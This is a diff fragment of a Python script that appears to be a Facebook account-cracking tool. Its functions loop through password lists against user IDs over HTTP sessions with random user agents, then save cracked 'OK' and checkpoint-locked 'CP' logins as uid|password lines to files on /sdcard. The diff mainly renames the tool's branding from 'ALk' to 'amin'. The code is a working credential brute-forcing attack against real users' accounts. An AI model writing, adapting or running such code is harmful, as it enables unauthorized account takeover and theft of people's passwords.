+                                        open('/sdcard/amin-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                         oks.append(str(uid))
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
@@ -1524,8 +1524,8 @@ def ALk5(ids,passlist):
                                         uid = ids
                                 if uid in oks:pass
                                 else:
-                                        print('\r\r\x1b[38;5;205m [ALk-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/ALk-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        print('\r\r\x1b[38;5;205m [amin-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/amin-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                         cps.append(str(ids))
                                         break
                         else:continue
@@ -1533,12 +1533,12 @@ def ALk5(ids,passlist):
         except Exception as e:
                 pass
 #method6
-def ALk6(ids,passlist):
+def amin6(ids,passlist):
 	global loop
 	global oks
 	try:
 		for pas in passlist:
-			sys.stdout.write('\r\r\033[1;37m [ALk-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+			sys.stdout.write('\r\r\033[1;37m [amin-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
 			session = requests.Session()
 			ua = random.choice(ugen)
 			free_fb = session.get('https://free.facebook.com').text
@@ -1579,10 +1579,10 @@ def ALk6(ids,passlist):
 				if uid in oks:pass
 				else:
 					if 'checkpoint' in str(lo):
-						print('\r\r\033[1;34m [ALk-2F] '+uid+' | '+pas)
+						print('\r\r\033[1;34m [amin-2F] '+uid+' | '+pas)
 					else:
-						print(f'\r\x1b[1;32m [ALk-OK] '+uid+' | '+pas)
-						open('/sdcard/ALk-rnd-OK.txt', 'a').write(uid+'|'+pas+'\n')
+						print(f'\r\x1b[1;32m [amin-OK] '+uid+' | '+pas)
+						open('/sdcard/amin-rnd-OK.txt', 'a').write(uid+'|'+pas+'\n')
 						oks.append(uid)
 						break
 			elif 'checkpoint' in log_cookies:
@@ -1590,8 +1590,8 @@ def ALk6(ids,passlist):
 				uid=coki[141:156]
 				if uid in cps:pass
 				else:
-					print('\r\r\x1b[38;5;205m [ALk-CP] '+uid+' | '+pas+'\033[1;97m')
-					open('/sdcard/ALk-rnd-CP.txt', 'a').write(uid+'|'+pas+'\n')
+					print('\r\r\x1b[38;5;205m [amin-CP] '+uid+' | '+pas+'\033[1;97m')
+					open('/sdcard/amin-rnd-CP.txt', 'a').write(uid+'|'+pas+'\n')
 					cps.append(ids)
 					break
 			else:
